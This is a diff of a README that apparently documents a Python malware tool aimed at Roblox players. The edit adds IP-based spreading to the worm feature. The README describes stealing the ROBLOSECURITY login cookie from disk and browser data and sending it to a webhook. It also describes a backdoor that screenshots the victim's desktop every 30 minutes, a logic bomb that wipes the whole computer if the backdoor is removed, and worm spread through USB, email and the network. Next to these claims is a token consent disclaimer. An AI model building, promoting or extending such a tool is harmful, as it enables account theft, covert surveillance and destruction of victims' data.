@@ -41,4 +41,4 @@ pyinstaller --onefile --noconsole --hidden-import psutil --hidden-import request
 When executed on a machine, the script will wait for a **Roblox Related** application to be oppened. He will then search the whole computer data and browser data in search of the roblox login cookie (ROBLOSECURITY). Once found, it will send the cookie to the designed webhook, leave behind him a backdoor that will send a screenshot of the targeted user desktop **every 30 Minutes** and leave another logic bomb that will continuisly check to see if the backdoor has been deleted, if yes, it will wipe the whole user computer from top to bottom. 
 
 ***DO NOT RUN THIS SCRIPT ON YOUR OWN MACHINE OR ON SOMEONE ELSE MACHINE WITHOUT THEIR CONSENT.***
-**Ive implemented a WORM in the script, meaning that it will spread in the network through usb and emails. Please be cautious of the uses of this script.**
+**Ive implemented a WORM in the script, meaning that it will spread in the network through ip, usb and emails. Please be cautious of the uses of this script.**
